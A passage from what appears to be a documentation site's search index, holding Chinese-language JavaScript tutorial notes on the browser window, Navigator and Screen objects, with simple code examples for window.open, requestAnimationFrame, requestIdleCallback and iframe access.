\u5982\u679c\u4e00\u4e2a\u7a97\u53e3\u88ab\u5d4c\u5165\u53e6\u4e00\u4e2a\u7a97\u53e3\uff0c\u8fd9\u4e2a\u5c5e\u6027\u8fd4\u56de\u539f\u59cb\u7684\u7236\u7a97\u53e3\u3002\u5982\u679c\u5f53\u524d\u7a97\u53e3\u662f\u9876\u5c42\u7a97\u53e3\uff0c\u6216\u8005\u548c\u7236\u7a97\u53e3\u4e0d\u662f\u540c\u6e90\u7684\uff0c\u90a3\u4e48\u8fd4\u56de\u503c\u662fnull\u3002</li> <li>window.top \u6267\u884c\u9876\u5c42\u7a97\u53e3\u3002\u4e3b\u8981\u7528\u4e8e\u6846\u67b6\u7a97\u53e3\u4e2d\u83b7\u53d6\u9876\u5c42\u7a97\u53e3\uff0c\u5982\u679c\u6ca1\u6709\u6846\u67b6\uff0c\u8fd4\u56dewindow</li> <li>window.parent \u8fd4\u56de\u7236\u7a97\u53e3\uff1b\u5982\u679c\u6ca1\u6709\u7236\u7a97\u53e3\uff0c\u8fd4\u56de\u81ea\u8eab</li> </ul> <p>\u9ad8\u6e05\u5c4f\u5e55\u7684\u5c5e\u6027</p> <ul> <li>window.devicePixelRatio \u8fd4\u56de\u663e\u793a\u50cf\u7d20\u548c\u7269\u7406\u50cf\u7d20\u7684\u6bd4\u503c\uff1a\u5982\u679c\u6bd4\u4f8b\u8f83\u5927\uff0c\u8bf4\u660e\u5904\u4e8e\u9ad8\u6e05\u5c4f\u5e55(\u5f53\u524d\u662f2)</li> </ul> <p>\u4f4d\u7f6e\u5c5e\u6027</p> <ul> <li>window.screenX screenY \u6d4f\u89c8\u5668\u5de6\u4e0a\u89d2\u76f8\u5bf9\u4e8e\u5c4f\u5e55\u7684\u4f4d\u7f6e</li> <li>window.innerHeight window.innerWidth \u6d4f\u89c8\u5668\u89c6\u53e3\u7684\u5c3a\u5bf8(\u5305\u62ec\u6eda\u52a8\u6761)\u5982\u679c\u754c\u9762\u53d8\u6210200%\uff0c \u90a3\u4e48\u89c6\u53e3\u4f1a\u53d8\u5c0f</li> <li>window.outerHeight window.outerWidth \u6d4f\u89c8\u5668\u7a97\u53e3\u7684\u5c3a\u5bf8(\u5305\u62ec\u83dc\u5355\u680f\u548cborder)</li> <li>window.scrollX scrollY </li> </ul> <p>\u7ec4\u4ef6\u5c5e\u6027\uff1a\u83b7\u53d6\u6d4f\u89c8\u5668\u7684\u7ec4\u4ef6\u5bf9\u8c61\uff08\u72b6\u6001\u680f\u5730\u5740\u680f\u5de5\u5177\u680f\u7b49\uff09</p> <p>\u5168\u5c40\u5bf9\u8c61\u5c5e\u6027\uff1adocument/location/navigator/history/localStorage/sessionStorage/console/screen</p> <p>window.isSecureContext \u8fd4\u56de\u662f\u5426\u5904\u4e8e\u52a0\u5bc6\u72b6\u6001\uff08https\uff09</p>"},{"location":"ebook-JS-basic/10-1-BOM/#_7","title":"\u65b9\u6cd5","text":"<p>window.alert() window.confirm() window.prompt()</p> <p>window.open(url, windowName, windowFeature) window.close() \u5173\u95ed\u5f53\u524d\u7684\u7a97\u53e3 window.stop() \u505c\u6b62\u5f53\u524d\u7a97\u53e3\u7684\u52a0\u8f7d(\u7b49\u4ef7\u4e8e\u6d4f\u89c8\u5668\u505c\u6b62\u6309\u94ae)</p> <p>\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff1awindowName\uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u65b0\u7a97\u53e3\u7684\u540d\u5b57\u3002\u5982\u679c\u8be5\u540d\u5b57\u7684\u7a97\u53e3\u5df2\u7ecf\u5b58\u5728\uff0c\u5219\u5360\u7528\u8be5\u7a97\u53e3\uff0c\u4e0d\u518d\u65b0\u5efa\u7a97\u53e3\u3002\u5982\u679c\u7701\u7565\uff0c\u5c31\u9ed8\u8ba4\u4f7f\u7528_blank\uff0c\u8868\u793a\u65b0\u5efa\u4e00\u4e2a\u6ca1\u6709\u540d\u5b57\u7684\u7a97\u53e3\u3002\u53e6\u5916\u8fd8\u6709\u51e0\u4e2a\u9884\u8bbe\u503c\uff0c_self\u8868\u793a\u5f53\u524d\u7a97\u53e3\uff0c_top\u8868\u793a\u9876\u5c42\u7a97\u53e3\uff0c_parent\u8868\u793a\u4e0a\u4e00\u5c42\u7a97\u53e3\u3002</p> <p>open()\u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u867d\u7136\u53ef\u4ee5\u6307\u5b9a\u5df2\u7ecf\u5b58\u5728\u7684\u7a97\u53e3\uff0c\u4f46\u662f\u4e0d\u7b49\u4e8e\u53ef\u4ee5\u4efb\u610f\u63a7\u5236\u5176\u4ed6\u7a97\u53e3\u3002\u4e3a\u4e86\u9632\u6b62\u88ab\u4e0d\u76f8\u5e72\u7684\u7a97\u53e3\u63a7\u5236\uff0c\u6d4f\u89c8\u5668\u53ea\u6709\u5728\u4e24\u4e2a\u7a97\u53e3\u540c\u6e90\uff0c\u6216\u8005\u76ee\u6807\u7a97\u53e3\u88ab\u5f53\u524d\u7f51\u9875\u6253\u5f00\u7684\u60c5\u51b5\u4e0b\uff0c\u624d\u5141\u8bb8open\u65b9\u6cd5\u6307\u5411\u8be5\u7a97\u53e3\u3002\u5982\u679c\u65b0\u7a97\u53e3\u548c\u7236\u7a97\u53e3\u4e0d\u662f\u540c\u6e90\u7684\uff08\u5373\u4e0d\u5728\u540c\u4e00\u4e2a\u57df\uff09\uff0c\u5b83\u4eec\u5f7c\u6b64\u4e0d\u80fd\u83b7\u53d6\u5bf9\u65b9\u7a97\u53e3\u5bf9\u8c61\u7684\u5185\u90e8\u5c5e\u6027\u3002</p> <p>\u7b2c\u4e09\u4e2a\u53c2\u6570\u8868\u793a\u65b0\u6253\u5f00\u7a97\u53e3\u7684\u5c5e\u6027\uff0c\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32(array.join(',')),\u5c5e\u6027\u89c1 https://wangdoc.com/javascript/bom/window.html</p> <pre><code>var popup = window.open(\n  'somepage.html',\n  'DefinitionsWindows',\n  'height=200,width=200,location=no,status=yes,resizable=yes,scrollbars=yes'\n);\n</code></pre> <pre><code>window.moveTo()\nwindow.moveBy()\n\u628a\u5f53\u524d\u7a97\u53e3\u79fb\u52a8\u5230\u67d0\u4e2a\u5750\u6807\uff0c\u6216\u8005\u79fb\u52a8\u67d0\u4e2a\u4f4d\u79fb\uff0c\u8fd9\u4e2a\u7a97\u53e3\u5fc5\u987b\u662f\u65b0\u5efa\u7684\u7a97\u53e3\n\nwindow.resizeTo(window.screen.availWidth / 2, window.screen.availHeight / 2)\nwindow.resizeBy(-100, -200)\n\u5f53\u524d\u7a97\u53e3\u7f29\u653e\u5230\u67d0\u4e2a\u5c3a\u5bf8(\u5c4f\u5e55\u7684\u4e00\u534a)\n\nwindow.scrollTo window.scrollBy\nwindow.print()\nwindow.focus() window.blur() \u901a\u5e38\u6253\u5f00\u4e00\u4e2a\u65b0\u7a97\u53e3\u5e76\u83b7\u5f97\u7126\u70b9(\u663e\u793a\u5728\u9875\u9762\u6700\u524d\u9762)\n\nlet selectionObj = window.getSelection();\nlet text = selectionObj.toString();\n\nwindow.getComputedStyle()\nwindow.matchMedia()\n</code></pre> <p>window.requestAminationFrame()</p> <p>\u8fd9\u4e2a\u65b9\u6cd5\u7c7b\u4f3c\u4e8e setTimeout \u4f1a\u63a8\u8fdf\u51fd\u6570\u5230\u6d4f\u89c8\u5668\u4e0b\u4e00\u6b21\u91cd\u6d41\u65f6\u6267\u884c\uff0c\u6267\u884c\u5b8c\u624d\u4f1a\u8fdb\u884c\u4e0b\u4e00\u6b21\u91cd\u7ed8\uff0c\u8fd9\u4e2a\u51fd\u6570\u6ca1\u6709\u8bbe\u5b9a\u65f6\u95f4\uff0c\u6d4f\u89c8\u5668\u53ef\u4ee5\u6839\u636e\u8bbe\u5907\u7684\u901f\u5ea6\u8c03\u8282\u6267\u884c\u7684\u65f6\u95f4\u3002\u5982\u679c\u51fd\u6570\u6539\u53d8\u7f51\u9875\u7684\u5e03\u5c40\uff0c\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u8fd9\u6837\u53ef\u4ee5\u8282\u7701\u7cfb\u7edf\u8d44\u6e90\uff0c\u4f7f\u5f97\u7f51\u9875\u6548\u679c\u66f4\u52a0\u5e73\u6ed1\u3002</p> <p>window.requestAnimationFrame(callback) \u56de\u8c03\u51fd\u6570\u53ef\u4ee5\u83b7\u53d6\u4e00\u4e2a\u65f6\u95f4\u6233\uff0c\u8868\u793a\u8ddd\u79bb\u7f51\u9875\u52a0\u8f7d\u7684\u65f6\u95f4</p> <p><code>window.requestAnimationFrame()</code>\u7684\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u6574\u6570\uff0c\u8fd9\u4e2a\u6574\u6570\u53ef\u4ee5\u4f20\u5165window.cancelAnimationFrame()\uff0c\u7528\u6765\u53d6\u6d88\u56de\u8c03\u51fd\u6570\u7684\u6267\u884c\u3002\u4e0b\u9762\u662f\u4e00\u4e2a\u754c\u9762\u52a8\u753b</p> <pre><code>var element = document.getElementById('animate');\nelement.style.position = 'absolute';\n\nvar start = null;\n\nfunction step(timestamp) {\n  if (!start) {\n    start = timestamp;\n  }\n  var progress = timestamp - start;\n  // \u5143\u7d20\u4e0d\u65ad\u5411\u5de6\u79fb\uff0c\u6700\u5927\u4e0d\u8d85\u8fc7200\u50cf\u7d20\n  element.style.left = Math.min(progress / 10, 200) + 'px';\n  // \u5982\u679c\u8ddd\u79bb\u7b2c\u4e00\u6b21\u6267\u884c\u4e0d\u8d85\u8fc7 2000 \u6beb\u79d2\uff0c\n  // \u5c31\u7ee7\u7eed\u6267\u884c\u52a8\u753b\n  if (progress &lt; 2000) {\n    window.requestAnimationFrame(step);\n  }\n}\n\nwindow.requestAnimationFrame(step);\n</code></pre> <p>window.requestIdleCallback()</p> <p><code>window.requestIdleCallback()</code>\u8ddf<code>setTimeout</code>\u7c7b\u4f3c\uff0c\u4e5f\u662f\u5c06\u67d0\u4e2a\u51fd\u6570\u63a8\u8fdf\u6267\u884c\uff0c\u4f46\u662f\u5b83\u4fdd\u8bc1\u5c06\u56de\u8c03\u51fd\u6570\u63a8\u8fdf\u5230\u7cfb\u7edf\u8d44\u6e90\u7a7a\u95f2\u65f6\u6267\u884c\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u67d0\u4e2a\u4efb\u52a1\u4e0d\u662f\u5f88\u5173\u952e\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528<code>window.requestIdleCallback()</code>\u5c06\u5176\u63a8\u8fdf\u6267\u884c\uff0c\u4ee5\u4fdd\u8bc1\u7f51\u9875\u6027\u80fd\u3002</p> <p>\u5b83\u8ddf<code>window.requestAnimationFrame()</code>\u7684\u533a\u522b\u5728\u4e8e\uff0c\u540e\u8005\u6307\u5b9a\u56de\u8c03\u51fd\u6570\u5728\u4e0b\u4e00\u6b21\u6d4f\u89c8\u5668\u91cd\u6392\u65f6\u6267\u884c\uff0c\u95ee\u9898\u5728\u4e8e\u4e0b\u4e00\u6b21\u91cd\u6392\u65f6\uff0c\u7cfb\u7edf\u8d44\u6e90\u672a\u5fc5\u7a7a\u95f2\uff0c\u4e0d\u4e00\u5b9a\u80fd\u4fdd\u8bc1\u572816\u6beb\u79d2\u4e4b\u5185\u5b8c\u6210\uff1b<code>window.requestIdleCallback()</code>\u53ef\u4ee5\u4fdd\u8bc1\u56de\u8c03\u51fd\u6570\u5728\u7cfb\u7edf\u8d44\u6e90\u7a7a\u95f2\u65f6\u6267\u884c\u3002</p> <p>\u8be5\u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\u548c\u4e00\u4e2a\u914d\u7f6e\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\u3002\u914d\u7f6e\u5bf9\u8c61\u53ef\u4ee5\u6307\u5b9a\u4e00\u4e2a\u63a8\u8fdf\u6267\u884c\u7684\u6700\u957f\u65f6\u95f4\uff0c\u5982\u679c\u8fc7\u4e86\u8fd9\u4e2a\u65f6\u95f4\uff0c\u56de\u8c03\u51fd\u6570\u4e0d\u7ba1\u7cfb\u7edf\u8d44\u6e90\u6709\u65e0\u7a7a\u865a\uff0c\u90fd\u4f1a\u6267\u884c\u3002</p> <pre><code>window.requestIdleCallback(callback[, options])\n</code></pre> <p><code>callback</code>\u53c2\u6570\u662f\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\u3002\u8be5\u56de\u8c03\u51fd\u6570\u6267\u884c\u65f6\uff0c\u7cfb\u7edf\u4f1a\u4f20\u5165\u4e00\u4e2a<code>IdleDeadline</code>\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\u3002<code>IdleDeadline</code>\u5bf9\u8c61\u6709\u4e00\u4e2a<code>didTimeout</code>\u5c5e\u6027\uff08\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u4e3a\u8d85\u65f6\u8c03\u7528\uff09\u548c\u4e00\u4e2a<code>timeRemaining()</code>\u65b9\u6cd5\uff08\u8fd4\u56de\u8be5\u7a7a\u95f2\u65f6\u6bb5\u5269\u4f59\u7684\u6beb\u79d2\u6570\uff09\u3002</p> <p><code>options</code>\u53c2\u6570\u662f\u4e00\u4e2a\u914d\u7f6e\u5bf9\u8c61\uff0c\u76ee\u524d\u53ea\u6709<code>timeout</code>\u4e00\u4e2a\u5c5e\u6027\uff0c\u7528\u6765\u6307\u5b9a\u56de\u8c03\u51fd\u6570\u63a8\u8fdf\u6267\u884c\u7684\u6700\u5927\u6beb\u79d2\u6570\u3002\u8be5\u53c2\u6570\u53ef\u9009\u3002</p> <p><code>window.requestIdleCallback()</code>\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\u3002\u8be5\u6574\u6570\u53ef\u4ee5\u4f20\u5165<code>window.cancelIdleCallback()</code>\u53d6\u6d88\u56de\u8c03\u51fd\u6570\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>requestIdleCallback(myNonEssentialWork);\n\nfunction myNonEssentialWork(deadline) {\n  while (deadline.timeRemaining() &gt; 0) {\n    doWorkIfNeeded();\n  }\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>requestIdleCallback()</code>\u7528\u6765\u6267\u884c\u975e\u5173\u952e\u4efb\u52a1<code>myNonEssentialWork</code>\u3002\u8be5\u4efb\u52a1\u5148\u786e\u8ba4\u672c\u6b21\u7a7a\u95f2\u65f6\u6bb5\u6709\u5269\u4f59\u65f6\u95f4\uff0c\u7136\u540e\u624d\u771f\u6b63\u5f00\u59cb\u6267\u884c\u4efb\u52a1\u3002</p> <p>\u4e0b\u9762\u662f\u6307\u5b9a<code>timeout</code>\u7684\u4f8b\u5b50\u3002</p> <pre><code>requestIdleCallback(processPendingAnalyticsEvents, { timeout: 2000 });\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u6307\u5b9a\uff0c<code>processPendingAnalyticsEvents</code>\u5fc5\u987b\u5728\u672a\u67652\u79d2\u4e4b\u5185\u6267\u884c\u3002</p> <p>\u5982\u679c\u7531\u4e8e\u8d85\u65f6\u5bfc\u81f4\u56de\u8c03\u51fd\u6570\u6267\u884c\uff0c\u5219<code>deadline.timeRemaining()</code>\u8fd4\u56de<code>0</code>\uff0c<code>deadline.didTimeout</code>\u8fd4\u56de<code>true</code>\u3002</p> <p>\u5982\u679c\u591a\u6b21\u6267\u884c<code>window.requestIdleCallback()</code>\uff0c\u6307\u5b9a\u591a\u4e2a\u56de\u8c03\u51fd\u6570\uff0c\u90a3\u4e48\u8fd9\u4e9b\u56de\u8c03\u51fd\u6570\u5c06\u6392\u6210\u4e00\u4e2a\u961f\u5217\uff0c\u6309\u7167\u5148\u8fdb\u5148\u51fa\u7684\u987a\u5e8f\u6267\u884c\u3002 </p>"},{"location":"ebook-JS-basic/10-1-BOM/#_8","title":"\u4e8b\u4ef6","text":"<p><pre><code>window.onload = function() {\n  //\n}\nwindow.onerror = function(message, filename, lineno, colno, error) {\n  // JS\u811a\u672c\u9519\u8bef\u4f1a\u89e6\u53d1onerror\n}\n</code></pre> window.onafterprint\uff1aafterprint\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onbeforeprint\uff1abeforeprint\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onbeforeunload\uff1abeforeunload\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onhashchange\uff1ahashchange\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onlanguagechange: languagechange\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onmessage\uff1amessage\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onmessageerror\uff1aMessageError\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onoffline\uff1aoffline\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.ononline\uff1aonline\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onpagehide\uff1apagehide\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onpageshow\uff1apageshow\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onpopstate\uff1apopstate\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onstorage\uff1astorage\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onunhandledrejection\uff1a\u672a\u5904\u7406\u7684 Promise \u5bf9\u8c61\u7684reject\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onunload\uff1aunload\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002</p>"},{"location":"ebook-JS-basic/10-1-BOM/#_9","title":"\u591a\u7a97\u53e3\u64cd\u4f5c","text":"<p>\u4e00\u4e2a\u7f51\u9875\u53ef\u4ee5\u4f7f\u7528iframe\u5d4c\u5165\u5176\u4ed6\u7f51\u9875\uff0c\u8fd9\u6837\u4e00\u4e2a\u754c\u9762\u4f1a\u5d4c\u5957\u591a\u5c42\u7f51\u9875\uff08\u8fd9\u4e2a\u6280\u672f\u73b0\u5728\u8fc7\u65f6\u4e86\uff09\u3002</p> <p>\u901a\u8fc7\u4e0b\u9762\u7684\u5c5e\u6027\u5224\u65ad\u662f\u5426\u662f\u9876\u5c42\u7a97\u53e3\uff1awindow.top window.parent window.self </p> <pre><code>if (window.top === window.self) {\n  // \u5f53\u524d\u7a97\u53e3\u662f\u9876\u5c42\u7a97\u53e3\n}\n</code></pre> <pre><code>&lt;a href=\"somepage.html\" target=\"_top\"&gt;Link&lt;/a&gt; \u8868\u793a\u5728\u9876\u5c42\u7a97\u53e3\u6253\u5f00\u94fe\u63a5\n</code></pre> <p>iframe \u5143\u7d20</p> <pre><code>let iframe = document.getElementBuId('#frame');\nlet innerWindow = iframe.contentWindow;\nlet innerDocument = iframe.contemtDocument;\ninnerWindow.frameElement === iframe\n// \u83b7\u53d6\u5b50\u7a97\u53e3\u7684window\u5bf9\u8c61\n\n// \u5982\u679c\u5728\u540c\u6e90\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u83b7\u53d6\u5185\u90e8window\u7684\u5c5e\u6027\ninnerWindow.title\n</code></pre> <p>\u5982\u679c\u7236\u7a97\u53e3\u548c\u5b50\u7a97\u53e3\u5904\u4e8e\u540c\u6e90\u65f6\uff0c\u4e24\u4e2a\u7a97\u53e3\u95f4\u53ef\u4ee5\u76f4\u63a5\u901a\u4fe1</p> <p>window.frames \u53ef\u4ee5\u83b7\u53d6\u5f53\u524d\u7a97\u53e3\u4e2d\u5168\u90e8\u5b50\u7a97\u53e3\u7684\u4f2a\u6570\u7ec4</p>"},{"location":"ebook-JS-basic/10-1-BOM/#103-navigator","title":"10.3 Navigator","text":"<p>Navigator \u8fd9\u4e2a\u5bf9\u8c61\u53ef\u4ee5\u53cd\u6620\u7528\u6237\u6d4f\u89c8\u5668\u548c\u7cfb\u7edf\u4fe1\u606f</p> <pre><code>Navigator.userAgent // \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36\" \u83b7\u53d6\u6d4f\u89c8\u5668\u7684\u5382\u5546\u548c\u57fa\u672c\u4fe1\u606f\u3002\u4ee5\u524d\u901a\u8fc7\u8fd9\u4e2a\u5c5e\u6027\u83b7\u53d6\u7528\u6237\u6d4f\u89c8\u5668\u540d\u79f0\u6765\u5904\u7406\u517c\u5bb9\u6027\u3002\u73b0\u5728\u7531\u4e8ePC\u7aef\u7248\u672c\u590d\u6742\uff0c\u4e00\u822c\u4e0d\u4f7f\u7528\u4e86\u3002\u73b0\u5728\u901a\u8fc7\u529f\u80fd\u8bc6\u522b\u7684\u65b9\u5f0f\uff0c\u83b7\u53d6\u6d4f\u89c8\u5668\u4fe1\u606f\u3002\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u5c5e\u6027\u5224\u65ad\u624b\u673a\u6d4f\u89c8\u5668\u548cPC\u7aef\u5927\u7c7b\n\nvar ua = navigator.userAgent.toLowerCase();\n\nif (/mobi/i.test(ua)) {\n  // \u624b\u673a\u6d4f\u89c8\u5668\n} else {\n  // \u975e\u624b\u673a\u6d4f\u89c8\u5668\n}\n\n/mobi|android|touch|mini/i.test(ua)\n\nNavigator.plugins \u8fd4\u56de\u4e00\u4e2a\u4f2a\u6570\u7ec4\uff0c\u662f\u6d4f\u89c8\u5668\u7684\u63d2\u4ef6(flash)\nNavigator.platform \u7528\u6237\u64cd\u4f5c\u7cfb\u7edf \"Linux x86_64\" \u4f46\u662f\u81ea\u5df1\u6d4b\u8bd5\u4e0d\u751f\u6548\nNavigator.onLine \u8fd4\u56de\u7528\u6237\u5728\u7ebf\u6216\u8005\u79bb\u7ebf \u5982\u679c\u662ffalse\uff0c\u80af\u5b9a\u79bb\u7ebf\uff1b\u5982\u679c\u662ftrue\uff0c\u53ef\u80fd\u7528\u6237\u6240\u5728\u5c40\u57df\u7f51\u4e5f\u662f\u79bb\u7ebf\u7684\uff0c\u53ef\u4ee5\u901a\u8fc7\u4e8b\u4ef6\u76d1\u542c\u83b7\u53d6\u7528\u6237\u5728\u7ebf\u60c5\u51b5\n\nwindow.addEventListener('offline', function(e) { console.log('offline'); });\nwindow.addEventListener('online', function(e) { console.log('online'); });\n\nNavigator.language\uff0cNavigator.languages \u8868\u793a\u7528\u6237\u7684\u9996\u9009\u8bed\u8a00\uff0c\u548c\u53ef\u4ee5\u63a5\u53d7\u7684\u8bed\u8a00(\u6d4f\u89c8\u5668\u7ffb\u8bd1\u754c\u9762\u4f7f\u7528)\n</code></pre> <pre><code>Navigator.geolocation \u5305\u542b\u7528\u6237\u5730\u7406\u4f4d\u7f6e\u7684\u4fe1\u606f\u3002\u6ce8\u610f\uff0c\u8be5 API \u53ea\u6709\u5728 HTTPS \u534f\u8bae\u4e0b\u53ef\u7528\u3002\nGeolocation \u5bf9\u8c61\u63d0\u4f9b\u4e0b\u9762\u4e09\u4e2a\u65b9\u6cd5\u3002\nGeolocation.getCurrentPosition()\uff1a\u5f97\u5230\u7528\u6237\u7684\u5f53\u524d\u4f4d\u7f6e\nGeolocation.watchPosition()\uff1a\u76d1\u542c\u7528\u6237\u4f4d\u7f6e\u53d8\u5316\nGeolocation.clearWatch()\uff1a\u53d6\u6d88watchPosition()\u65b9\u6cd5\u6307\u5b9a\u7684\u76d1\u542c\u51fd\u6570\n\u6ce8\u610f\uff0c\u8c03\u7528\u8fd9\u4e09\u4e2a\u65b9\u6cd5\u65f6\uff0c\u6d4f\u89c8\u5668\u4f1a\u8df3\u51fa\u4e00\u4e2a\u5bf9\u8bdd\u6846\uff0c\u8981\u6c42\u7528\u6237\u7ed9\u4e88\u6388\u6743\u3002\n\nNavigator.cookieEnabled \u8fd9\u4e2a\u5c5e\u6027\u53cd\u6620\u7684\u662f\u6d4f\u89c8\u5668\u603b\u7684\u7279\u6027\n</code></pre> <p>\u4e0b\u9762\u662f\u5e38\u89c1\u7684\u65b9\u6cd5</p> <pre><code>Navigator.javaEnabled() \u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u6d4f\u89c8\u5668\u662f\u5426\u80fd\u8fd0\u884c Java Applet \u5c0f\u7a0b\u5e8f\u3002\nNavigator.sendBeacon() \u7528\u4e8e\u5411\u670d\u52a1\u5668\u5f02\u6b65\u53d1\u9001\u6570\u636e\n</code></pre>"},{"location":"ebook-JS-basic/10-1-BOM/#104-screen","title":"10.4  Screen","text":"<p>Screen \u5bf9\u8c61\u8868\u793a\u5f53\u524d\u7a97\u53e3\u6240\u5728\u7684\u5c4f\u5e55\uff0c\u63d0\u4f9b\u663e\u793a\u8bbe\u5907\u7684\u4fe1\u606f\u3002<code>window.screen</code>\u5c5e\u6027\u6307\u5411\u8fd9\u4e2a\u5bf9\u8c61\u3002</p> <ul> <li><code>Screen.height</code>\uff1a\u6d4f\u89c8\u5668\u7a97\u53e3\u6240\u5728\u7684\u5c4f\u5e55\u7684\u9ad8\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002\u9664\u975e\u8c03\u6574\u663e\u793a\u5668\u7684\u5206\u8fa8\u7387\uff0c\u5426\u5219\u8fd9\u4e2a\u503c\u53ef\u4ee5\u770b\u4f5c\u5e38\u91cf\uff0c\u4e0d\u4f1a\u53d1\u751f\u53d8\u5316\u3002\u663e\u793a\u5668\u7684\u5206\u8fa8\u7387\u4e0e\u6d4f\u89c8\u5668\u8bbe\u7f6e\u65e0\u5173\uff0c\u7f29\u653e\u7f51\u9875\u5e76\u4e0d\u4f1a\u6539\u53d8\u5206\u8fa8\u7387\u3002</li> <li><code>Screen.width</code>\uff1a\u6d4f\u89c8\u5668\u7a97\u53e3\u6240\u5728\u7684\u5c4f\u5e55\u7684\u5bbd\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002</li> <li><code>Screen.availHeight</code>\uff1a\u6d4f\u89c8\u5668\u7a97\u53e3\u53ef\u7528\u7684\u5c4f\u5e55\u9ad8\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002\u56e0\u4e3a\u90e8\u5206\u7a7a\u95f4\u53ef\u80fd\u4e0d\u53ef\u7528\uff0c\u6bd4\u5982\u7cfb\u7edf\u7684\u4efb\u52a1\u680f\u6216\u8005 Mac \u7cfb\u7edf\u5c4f\u5e55\u5e95\u90e8\u7684 Dock \u533a\uff0c\u8fd9\u4e2a\u5c5e\u6027\u7b49\u4e8e<code>height</code>\u51cf\u53bb\u90a3\u4e9b\u88ab\u7cfb\u7edf\u7ec4\u4ef6\u7684\u9ad8\u5ea6\u3002</li> <li><code>Screen.availWidth</code>\uff1a\u6d4f\u89c8\u5668\u7a97\u53e3\u53ef\u7528\u7684\u5c4f\u5e55\u5bbd\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002</li> <li><code>Screen.pixelDepth</code>\uff1a\u6574\u6570\uff0c\u8868\u793a\u5c4f\u5e55\u7684\u8272\u5f69\u4f4d\u6570\uff0c\u6bd4\u5982<code>24</code>\u8868\u793a\u5c4f\u5e55\u63d0\u4f9b24\u4f4d\u8272\u5f69\u3002</li> <li><code>Screen.colorDepth</code>\uff1a<code>Screen.pixelDepth</code>\u7684\u522b\u540d\u3002\u4e25\u683c\u5730\u8bf4\uff0ccolorDepth \u8868\u793a\u5e94\u7528\u7a0b\u5e8f\u7684\u989c\u8272\u6df1\u5ea6\uff0cpixelDepth \u8868\u793a\u5c4f\u5e55\u7684\u989c\u8272\u6df1\u5ea6\uff0c\u7edd\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u5b83\u4eec\u90fd\u662f\u540c\u4e00\u4ef6\u4e8b\u3002</li> <li><code>Screen.orientation</code>\uff1a\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\uff0c\u8868\u793a\u5c4f\u5e55\u7684\u65b9\u5411\u3002\u8be5\u5bf9\u8c61\u7684<code>type</code>\u5c5e\u6027\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5c4f\u5e55\u7684\u5177\u4f53\u65b9\u5411\uff0c<code>landscape-primary</code>\u8868\u793a\u6a2a\u653e\uff0c<code>landscape-secondary</code>\u8868\u793a\u98a0\u5012\u7684\u6a2a\u653e\uff0c<code>portrait-primary</code>\u8868\u793a\u7ad6\u653e\uff0c<code>portrait-secondary</code>\u3002</li> </ul> <p>\u4e0b\u9762\u662f<code>Screen.orientation</code>\u7684\u4f8b\u5b50\u3002\u5177\u4f53\u7684\u5185\u5bb9\u53c2\u8003\uff1a</p> <p>https://www.cnblogs.com/ndos/p/8245164.html</p> <p>https://www.cnblogs.com/crafts/articles/5750522.html</p> <pre><code>window.screen.orientation\n// { angle: 0, type: \"landscape-primary\", onchange: null }\n</code></pre> <p>\u4e0b\u9762\u7684\u4f8b\u5b50\u4fdd\u8bc1\u5c4f\u5e55\u5206\u8fa8\u7387\u5927\u4e8e 1024 x 768\u3002</p> <pre><code>if (window.screen.width &gt;= 1024 &amp;&amp; window.screen.height &gt;= 768) {\n  // \u5206\u8fa8\u7387\u4e0d\u4f4e\u4e8e 1024x768\n}\n</code></pre> 